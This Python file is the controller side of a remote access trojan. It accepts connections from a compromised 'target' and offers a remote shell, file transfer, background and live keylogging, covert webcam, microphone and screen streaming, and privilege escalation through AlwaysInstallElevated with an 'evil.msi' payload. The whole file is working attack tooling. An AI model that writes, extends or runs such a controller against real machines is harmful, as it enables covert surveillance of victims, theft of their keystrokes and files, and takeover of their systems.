# Import necessary libraries
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import os  # This library allows interaction with the operating system.
import pynput
import re
import pyaudio  # This library is used for audio input/output operations.
from pynput.keyboard import Key, Listener  # This library is used for capturing keyboard events.
import threading
import cv2
import pickle
import struct
import time

# Function to send data reliably as JSON-encoded strings
def reliable_send(data):
    # Convert the input data into a JSON-encoded string.
    jsondata = json.dumps(data)
    # Send the JSON-encoded data over the network connection after encoding it as bytes.
    target.send(jsondata.encode())

# Function to receive data reliably as JSON-decoded strings
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
            # and remove any trailing whitespace characters.
            data = data + target.recv(1024).decode().rstrip()
            # Parse the received data as a JSON-decoded object.
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    f = open(file_name, 'rb')
    # Read the contents of the file and send them over the network connection to the target.
    target.send(f.read())

# Function to download a file from the target machine
def download_file(file_name,timeout):
    # Open the specified file in binary write ('wb') mode.
    f = open(file_name, 'wb')
    # Set a timeout for receiving data from the target (1 second).
    target.settimeout(timeout)
    chunk = target.recv(1024)
    while chunk:
        # Write the received data (chunk) to the local file.
        f.write(chunk)
        try:
            # Attempt to receive another chunk of data from the target.
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    # Reset the timeout to its default value (None).
    target.settimeout(None)
    # Close the local file after downloading is complete.
    f.close()


def keylogging_live():
    global livekeylogging_status, keylogging_filename, livekeylogger_ready_to_exit

    def check_stop_key(key):
        global livekeylogging_status, keylogging_filename, livekeylogger_ready_to_exit

        if key == Key.esc:
            reliable_send('keylogging_live_stop')
            livekeylogging_status = False
            listener.stop()
            print("[+] Live keylogging stopped")

            if keylogging_filename != None:
                print("[*] Downloading the previous live keylogging sessions file...")
                try:
                    download_file(keylogging_filename,1)
                    print(f"[+] Successfully download the previous live key-logging session file as {keylogging_filename}")
                except:
                    print("[-] Fail to download the previous live keylogging sessions file")
                keylogging_filename = None
                print('[*] Redirecting user to main menu...')

            livekeylogger_ready_to_exit = True

    listener = Listener(on_press=check_stop_key)
    listener.start()

    if keylogging_filename == None:
        print("[!] Due to no input filename or unvalid filename, this key-logging session's log file won't be downloaded at the end of the session.")
    else:
        print(f'[i] This key-logging session log file will be downloaded as "{keylogging_filename}" inside your current directory')

    print("[+] Start listening to the target keys (Press ESC to end the session)")
    print("[i] Pressing key will be displayed in the terminal down below")

    while livekeylogging_status:
        keylog = reliable_recv()
        print(keylog) if keylog != 'end of keylogging' else None

    # wait for def(check_stop_key) done executing then back to main menu
    while livekeylogger_ready_to_exit != True:
        pass

# --- Stream Reception Functions ---
def video_reception_thread():
    global video_thread_active, video_connected
    video_thread_active = True
    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    video_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    video_server.bind(('0.0.0.0', VIDEO_PORT))
    video_server.listen(1)
    print("[*] Video server waiting for connection on port 9999...")
    
    try:
        conn, addr = video_server.accept()
        print(f"[+] Video client connected from: {addr}")
        video_connected = True
        
        data = b""
        payload_size = struct.calcsize("L")

        while video_thread_active:
            while len(data) < payload_size:
                packet = conn.recv(4096)
                if not packet: raise ConnectionError("Client disconnected")
                data += packet
            
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += conn.recv(4096)
            
            frame_data = data[:msg_size]
            data = data[msg_size:]
            
            frame = pickle.loads(frame_data)
            cv2.imshow('Live Video Stream', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                print("[!] 'q' pressed in video window. Type 'stream_stop' in shell to exit.")
                break
    except Exception as e:
        print(f"[-] Video stream ended: {e}")
    finally:
        print("[+] Video reception thread finished.")
        cv2.destroyWindow('Live Video Stream')
        if 'conn' in locals():
            conn.close()
        video_server.close()
        video_thread_active = False
        video_connected = False


def audio_reception_thread():
    global audio_thread_active, audio_connected
    audio_thread_active = True
    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    audio_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    audio_server.bind(('0.0.0.0', AUDIO_PORT))
    audio_server.listen(1)
    print("[*] Audio server waiting for connection on port 9998...")

    try:
        conn, addr = audio_server.accept()
        print(f"[+] Audio client connected from: {addr}")
        audio_connected = True

        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
        
        while audio_thread_active:
            data = conn.recv(1024)
            if not data: break
            stream.write(data)
    except Exception as e:
        print(f"[-] Audio stream ended: {e}")
    finally:
        print("[+] Audio reception thread finished.")
        if 'stream' in locals() and stream.is_active():
            stream.stop_stream()
            stream.close()
        if 'p' in locals():
            p.terminate()
        if 'conn' in locals():
            conn.close()
        audio_server.close()
        audio_thread_active = False
        audio_connected = False


def screen_reception_thread():
    global screen_thread_active, screen_connected
    screen_thread_active = True
    screen_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screen_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    screen_server.bind(('0.0.0.0', SCREEN_PORT))
    screen_server.listen(1)
    print("[*] Screen server waiting for connection on port 9997...")

    def receive_frame(sock):
        try:
            # Receive frame size
            frame_size_data = b""
            while len(frame_size_data) < 4:
                frame_size_data += sock.recv(4 - len(frame_size_data))
            
            frame_size = struct.unpack("L", frame_size_data)[0]
            
            # Receive frame data
            frame_data = b""
            while len(frame_data) < frame_size:
                chunk = sock.recv(frame_size - len(frame_data))
                if not chunk:
                    return None
                frame_data += chunk
            
            # Deserialize frame
            buffer = pickle.loads(frame_data)
            
            # Decode JPEG buffer back to OpenCV frame
            frame = cv2.imdecode(buffer, cv2.IMREAD_COLOR)
            
            return frame
            
        except Exception as e:
            print(f"Error receiving frame: {e}")
            return None

    try:
        conn, addr = screen_server.accept()
        print(f"[+] Screen client connected from: {addr}")
        screen_connected = True

        # Create OpenCV window
        cv2.namedWindow("Target Screen", cv2.WINDOW_NORMAL)                                            
        cv2.resizeWindow("Target Screen", 1024, 768)

        # Optional: Set window properties for better display
        cv2.setWindowProperty("Target Screen", cv2.WND_PROP_ASPECT_RATIO, cv2.WINDOW_KEEPRATIO)

        while screen_thread_active:
            frame = receive_frame(conn)
                
            if frame is None:
                print("Connection lost or error receiving frame")
                break
                
            # Display frame
            cv2.imshow("Target Screen", frame)
                
            # Check for exit (ESC key or window close)
            key = cv2.waitKey(1) & 0xFF
            if key == 27:  # ESC key
                pass

    except Exception as e:
        print(f"Server error: {e}")
    finally:
        print("[+] Screen reception thread finished.")
        try:
            conn.close()
        except:
            pass
        screen_server.close()
        cv2.destroyWindow("Target Screen")
        screen_thread_active = False
        screen_connected = False

# Function for the main communication loop with the target
def target_communication():
    global keylogging_filename, keylogging_status, livekeylogging_status, video_thread_active, audio_thread_active, livekeylogger_ready_to_exit, video_connected, audio_connected, screen_connected, screen_thread_active

    while True:
        if not video_thread_active and not audio_thread_active:
            print("\n=== Main Menu ===")
            print("> [S] Open Shell")
            print("> [K] Keylogger")
            print("> [L] Live Capturing Screen & audio")
            print("> [P] Privilege Escalation")
            print("> [Q] Quit")
        else:
            print("\n=== Main Menu ===")
            print("> [S] Open Shell")
            print("> [K] Keylogger")
            print("> [L] Stop Live Capturing Screen & audio")
            print("> [P] Privilege Escalation")
            print("> [Q] Quit")

        choice = input("Select an option: ").strip().lower()

        if choice == "q":
            reliable_send('quit')
            video_thread_active = False
            audio_thread_active = False
            break

        elif choice == "s":
            print('\n[+] opening the target shell..')
            print('[i] type "command" to view the user manual')
            print('[i] type "menu" to go back to the main menu\n')
            while True:
                command = input('* Shell~%s: ' % str(ip))
                reliable_send(command)
                if command == 'menu':
                    break
                elif command == 'clear':
                    os.system('clear')
                elif command == 'command':
                    print('\n=== Command list ===')
                    print('"menu"               : go back to main menu')
                    print('"clear"              : clear current terminal')
                    print('"cd <dir>"           : change the target current directory')
                    print('"download <file>"    : downlaod a file from the target')
                    print('"uploload <file>"    : upload a file to the target')
                    print('[i] any commands exclude from above will be execute directly in the target shell\n')
                elif command[:2] == 'cd':
                    pass
                elif command[:8] == 'download':
                    download_file(command[9:],1)
                elif command[:6] == 'upload':
                    upload_file(command[7:])
                else:
                    result = reliable_recv()
                    print(result)

        elif choice == "k":
            while True:
                print('\n === Keylogger Menu ===')
                if not keylogging_status:
                    print("> [1] Background Keylogging")
                    print("> [2] Live Keylogging")
                    print("> [3] Return to main menu")
                else:
                    print("> [1] Stop current Background Keylogging session")
                    print("> [2] Live Keylogging")
                    print("> [3] Return to main menu")

                keylogger_choice = input("Select an option: ").strip()

                if keylogger_choice == "1":
                    if not keylogging_status:
                        print('\n[+] You have selected Background Keylogging')
                        filename = input("Enter filename for the output log file: ")
                        filename = re.sub(r'[\\/:*?"<>|]', '', filename).replace(' ', '')       #sanitized filename
                        keylogging_filename = filename if (filename != "") else 'keylog.txt'    #set default filename
                        print('[+] Background key-logging session Started. To end this session, select the stop option in the keylogger menu')
                        print(f"[i] This background key-logging session's log file will be record as \"{keylogging_filename}\"")

                        keylogging_status = True
                        reliable_send(f'keylogging_start {keylogging_filename}')
                        break

                    else:
                        reliable_send('keylogging_stop')
                        print('[*] Stopping Keylogging...')
                        download_file(keylogging_filename, 1)
                        print(f'[+] Successfully download the previous keylogging session file as {keylogging_filename}')

                        keylogging_status = False
                        keylogging_filename = None
                        break

                elif keylogger_choice == "2":
                    if not livekeylogging_status:
                        filename = input("Enter filename for the output log file (Optional): ")
                        filename = re.sub(r'[\\/:*?"<>|]', '', filename).replace(' ', '')       #sanitized filename
                        keylogging_filename = filename if (filename != "") else None    #set default filename

                        reliable_send(f'keylogging_live {keylogging_filename}')
                        livekeylogging_status = True
                        livekeylogger_ready_to_exit = False
                        keylogging_live()
                        break

                elif keylogger_choice == '3':
                    print("going back to the main menu...")
                    break

                else:
                    print("[!] Invalid choice")
            
        elif choice == 'p':
            while True:
                print("\n=== Privilege Escalation Menu ===")
                print("> [1] Check AlwaysInstallElevated (AIE)")
                print("> [2] Upload evil.msi")
                print("> [3] Run evil.msi")
                print("> [4] Delete hacker user")
                print("> [5] Return to main menu")
                tool_choice = input("Select a tool: ").strip()

                if tool_choice == '1':
                    reliable_send("check_aie")
                    print(reliable_recv())
                elif tool_choice == '2':
                    reliable_send("upload evil.msi")
                    upload_file("evil.msi")
                    print("[+] evil.msi uploaded.")
                elif tool_choice == '3':
                    reliable_send("run_evil_msi")
                    print(reliable_recv())
                elif tool_choice == '4':
                    reliable_send("delete_hacker_user")
                    print(reliable_recv())
                elif tool_choice == '5':
                    break
                else:
                    print("[!] Invalid tool selection.")

        elif choice == 'l':
            while True:
                print('\n=== Live Menu ===')
                print('> [1] Start Live Audio' if not audio_thread_active else '> [1] Stop Live Audio')
                print('> [2] Start Live Screen' if not screen_thread_active else '> [2] Stop Live Screen')
                print('> [3] Start Live Webcam' if not video_thread_active else '> [3] Stop Live Webcam')
                print('> [4] Main Menu')
                live_choice = input("Select a choice: ").strip()

                if live_choice == "1":
                    if not audio_thread_active:
                        reliable_send('stream_start_audio')
                        threading.Thread(target=audio_reception_thread, daemon=True).start()

                        while audio_connected == False:
                            pass

                    else:
                        reliable_send('stream_stop_audio')
                        audio_thread_active = False

                        while audio_connected == True:
                            pass

                elif live_choice == '2':
                    if not screen_thread_active:
                        reliable_send('stream_start_screen')
                        threading.Thread(target=screen_reception_thread, daemon=True).start()

                        while screen_connected == False:
                            pass

                    else:
                        reliable_send('stream_stop_screen')
                        screen_thread_active = False

                        while screen_connected == True:
                            pass

                elif live_choice == '3':
                    if not video_thread_active:
                        reliable_send('stream_start_video')
                        threading.Thread(target=video_reception_thread, daemon=True).start()

                        while video_connected == False:
                            pass

                    else:
                        reliable_send('stream_stop_video')
                        video_thread_active = False

                        while video_connected == True:
                            pass

                elif live_choice == '4':
                    break

                else:
                    print("[!] Invalid Choice")





            # if not video_thread_active and not audio_thread_active:
            #     reliable_send('stream_start')
            #     v_thread = threading.Thread(target=video_reception_thread, daemon=True)
            #     v_thread.start()
            #     a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
            #     a_thread.start()

            #     #wait for both video and audio connect then go back to main menu
            #     while video_connected == False or audio_connected == False:
            #         pass

            # elif video_thread_active and audio_thread_active:
            #     video_thread_active = False
            #     audio_thread_active = False

            #     #wait for both video and audio disconnect then go back to main menu
            #     while video_connected or audio_connected:
            #         pass

        else:
            print("[!] Invalid main menu option.")

# Port Control Section
CONTROL_PORT = 5555
VIDEO_PORT = 9999
AUDIO_PORT = 9998
SCREEN_PORT = 9997

# Initialize live capturing screen and audio parameters as False
video_thread_active, audio_thread_active, screen_thread_active = False, False, False
video_connected, audio_connected, screen_connected = False, False, False

# Initialize live audio status as False
livekeylogging_status = False

# Initialize <livekeylogger_ready_to_exit> parameter to indicate program which is it ready to exit yet or not
livekeylogger_ready_to_exit = True

# Initialize keylogging filename as None
keylogging_filename = None

# Initialize keylogging status as False
keylogging_status = False 

# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to any incoming request address ('0.0.0.0') to the port (5555).
sock.bind(('0.0.0.0', CONTROL_PORT))

# Start listening for incoming connections (maximum 5 concurrent connections).
print('[+] Listening For The Incoming Connections')
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address.
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Start the main communication loop with the target by calling target_communication.
target_communication()